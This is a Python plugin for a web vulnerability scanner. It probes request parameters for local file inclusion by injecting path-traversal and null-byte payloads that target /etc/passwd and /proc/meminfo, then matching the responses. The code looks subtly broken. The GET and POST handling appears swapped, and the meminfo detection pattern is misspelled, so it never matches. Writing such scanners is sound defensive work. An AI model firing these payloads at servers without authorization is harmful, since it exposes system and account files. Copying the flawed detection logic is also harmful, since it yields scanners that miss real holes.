#encoding: utf-8

import logging
import random
import copy
import re

from simhash import Simhash

from crawler import Curl

from . import register
from .base import CommonVulnerability
from .vul import Vulnerability
from .serverity import Serverity


logger = logging.getLogger(__name__)

@register('lfi')
class LFI(CommonVulnerability):

    NAME = '本地文件包含'
    RANK = Serverity.HIGH

    NIL = lambda *args, **kwargs: None

    def __init__(self):
        self.__white_params = []

    def check(self, request):
        white_params = self.__white_params

        curl = Curl()

        key = ''
        callback = None
        params = {}
        if request.method == 'GET':
            key = 'data'
            callback = curl.post
            params = request.params
        else:
            key = 'params'
            callback = curl.get
            params = request.post

        playloads = self.__get_playloads(params)
        rt_list = []
        for name, poc, pattern in playloads:
            if name in white_params:
                continue

            response = callback(request.url, **{key : poc})
            logger.debug('check result: %s, %s, %s, %s',
                            request.url, key, poc, response)

            if not response.body or re.search(pattern, response.body, re.I) is None:
                continue

            vul = Vulnerability(self.NAME, self.RANK, request.url.url,
                                    request.method, name, poc)
            logger.info(vul)
            rt_list.append(vul)

        return rt_list

    def __get_playloads(self, params):
        playloads = []

        lfis = self.__get_lfis()
        for name, value in params.items():
            value = "".join(value) if isinstance(value, (list, )) else value

            for lfi in lfis:
                lfi_type = lfi['type']
                pattern = lfi['pattern']
                pls = lfi['playloads']
                for pl in pls:
                    poc = copy.deepcopy(params)
                    poc[name] = pl
                    playloads.append((name, poc, pattern))

        return playloads

    def __get_lfis(self):
        lfis = []
        lfis.append({
            'type' : 'meminfo',
            'pattern' : r'memtoal:\s*\d+\s*\w{2}',
            'playloads' : [
                '/proc/meminfo',
                '../../../../../../../../../../proc/meminfo',
                '../../../../../../../../../../proc/meminfo\x00',
                '../../../../../../../../../../proc/meminfo\x00.html',
            ]
        })

        lfis.append({
            'type' : 'passwd',
            'pattern' : r'root:x:0:0:',
            'playloads' : [
                '/etc/passwd',
                '../../../../../../../../../../etc/passwd',
                '../../../../../../../../../../etc/passwd\x00',
                '../../../../../../../../../../etc/passwd\x00.html',
            ]
        })
        return lfis